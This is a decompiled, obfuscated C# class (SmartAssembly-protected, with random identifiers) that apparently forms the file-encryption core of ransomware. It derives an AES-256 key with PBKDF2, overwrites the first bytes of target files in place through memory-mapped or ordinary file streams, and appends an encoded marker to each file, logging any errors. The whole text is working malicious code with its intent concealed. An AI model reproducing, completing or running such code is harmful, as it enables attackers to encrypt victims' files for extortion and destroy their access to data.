using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace orBiLhAbVg;

public static class PlbUICyTgm
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] gVuHxnhVsTtn(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = LogmceOejb(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes LogmceOejb(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] uFgRNBuxrJhxWug(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (MJmySpXyeIcv.iUKXcFGtGy == getString_0(107396874))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (MJmySpXyeIcv.hNuljeIxIR)
			{
				try
				{
					File.AppendAllText(MJmySpXyeIcv.hGxNuUuVHRPb, getString_0(107393131) + string_0 + getString_0(107407909) + ex.Message + getString_0(107396695));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void slbbArbZqAbLW(string rOoFWYQfcmSy, byte[] qhQaapTyrlC, byte[] pbehLBuafKw = null)
	{
		try
		{
			byte[] array = null;
			if (MJmySpXyeIcv.iUKXcFGtGy == getString_0(107396874))
			{
				array = (MJmySpXyeIcv.bqQwwzlxGWJXq ? Encoding.ASCII.GetBytes(MJmySpXyeIcv.AmPZukeXOc(MJmySpXyeIcv.hLIVLHeHJhf) + MJmySpXyeIcv.AmPZukeXOc(getString_0(107407851)) + Convert.ToString(MJmySpXyeIcv.mhEnUyoGdSryX) + MJmySpXyeIcv.AmPZukeXOc(getString_0(107407851))) : Encoding.ASCII.GetBytes(MJmySpXyeIcv.AmPZukeXOc(MJmySpXyeIcv.hLIVLHeHJhf) + MJmySpXyeIcv.AmPZukeXOc(getString_0(107407860)) + Convert.ToString(MJmySpXyeIcv.mhEnUyoGdSryX) + MJmySpXyeIcv.AmPZukeXOc(getString_0(107407860))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(rOoFWYQfcmSy, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(qhQaapTyrlC, 0, qhQaapTyrlC.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(rOoFWYQfcmSy, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!MJmySpXyeIcv.bqQwwzlxGWJXq)
				{
					fileStream.Write(array, 0, array.Length);
					return;
				}
				fileStream.Write(pbehLBuafKw, 0, pbehLBuafKw.Length);
				fileStream.Write(array, 0, array.Length);
				return;
			}
			array = (MJmySpXyeIcv.bqQwwzlxGWJXq ? Encoding.ASCII.GetBytes(MJmySpXyeIcv.AmPZukeXOc(MJmySpXyeIcv.hLIVLHeHJhf) + MJmySpXyeIcv.AmPZukeXOc(getString_0(107407851)) + Convert.ToString(MJmySpXyeIcv.mhEnUyoGdSryX) + MJmySpXyeIcv.AmPZukeXOc(getString_0(107407851))) : Encoding.ASCII.GetBytes(MJmySpXyeIcv.AmPZukeXOc(MJmySpXyeIcv.hLIVLHeHJhf) + MJmySpXyeIcv.AmPZukeXOc(getString_0(107407860)) + Convert.ToString(MJmySpXyeIcv.mhEnUyoGdSryX) + MJmySpXyeIcv.AmPZukeXOc(getString_0(107407860))));
			FileStream fileStream2 = new FileStream(rOoFWYQfcmSy, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream2.Write(qhQaapTyrlC, 0, qhQaapTyrlC.Length);
			fileStream2.Close();
			fileStream2.Dispose();
			using FileStream fileStream3 = new FileStream(rOoFWYQfcmSy, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!MJmySpXyeIcv.bqQwwzlxGWJXq)
			{
				fileStream3.Write(array, 0, array.Length);
				return;
			}
			fileStream3.Write(pbehLBuafKw, 0, pbehLBuafKw.Length);
			fileStream3.Write(array, 0, array.Length);
		}
		catch (Exception ex)
		{
			if (MJmySpXyeIcv.hNuljeIxIR)
			{
				try
				{
					File.AppendAllText(MJmySpXyeIcv.hGxNuUuVHRPb, getString_0(107393131) + rOoFWYQfcmSy + getString_0(107407810) + ex.Message + getString_0(107396695));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (MJmySpXyeIcv.bqQwwzlxGWJXq ? Encoding.ASCII.GetBytes(MJmySpXyeIcv.AmPZukeXOc(MJmySpXyeIcv.hLIVLHeHJhf) + MJmySpXyeIcv.AmPZukeXOc(getString_0(107407851)) + Convert.ToString(MJmySpXyeIcv.mhEnUyoGdSryX) + MJmySpXyeIcv.AmPZukeXOc(getString_0(107407851))) : Encoding.ASCII.GetBytes(MJmySpXyeIcv.AmPZukeXOc(MJmySpXyeIcv.hLIVLHeHJhf) + MJmySpXyeIcv.AmPZukeXOc(getString_0(107407860)) + Convert.ToString(MJmySpXyeIcv.mhEnUyoGdSryX) + MJmySpXyeIcv.AmPZukeXOc(getString_0(107407860))));
			FileStream fileStream4 = new FileStream(rOoFWYQfcmSy, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(qhQaapTyrlC, 0, qhQaapTyrlC.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(rOoFWYQfcmSy, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!MJmySpXyeIcv.bqQwwzlxGWJXq)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(pbehLBuafKw, 0, pbehLBuafKw.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static PlbUICyTgm()
	{
		Strings.CreateGetStringDelegate(typeof(PlbUICyTgm));
	}
}
